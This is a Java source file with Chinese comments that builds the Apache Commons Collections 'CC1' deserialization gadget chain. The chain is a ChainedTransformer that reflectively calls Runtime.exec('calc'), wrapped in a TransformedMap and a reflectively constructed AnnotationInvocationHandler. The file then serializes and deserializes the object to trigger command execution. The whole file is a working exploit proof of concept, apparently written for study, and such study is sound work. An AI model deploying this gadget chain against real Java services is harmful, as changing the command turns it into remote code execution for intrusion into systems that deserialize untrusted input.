package org.CC.CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });
        //创建transformedMap对象，chainedTransformer
        Map map = new HashMap();
        map.put("value",123);
        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
        //由于AnnotationInvocationHandler的构造方法是private，采用反射来构造对象
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        //这里的内容我们先随便填一下
        Object o = constructor.newInstance(SuppressWarnings.class, decorate);
        //序列化与反序列化，触发readObject方法，最终触发exec
        serialize(o);
        deSerialize();
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object deSerialize() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));
        return ois.readObject();
    }
}
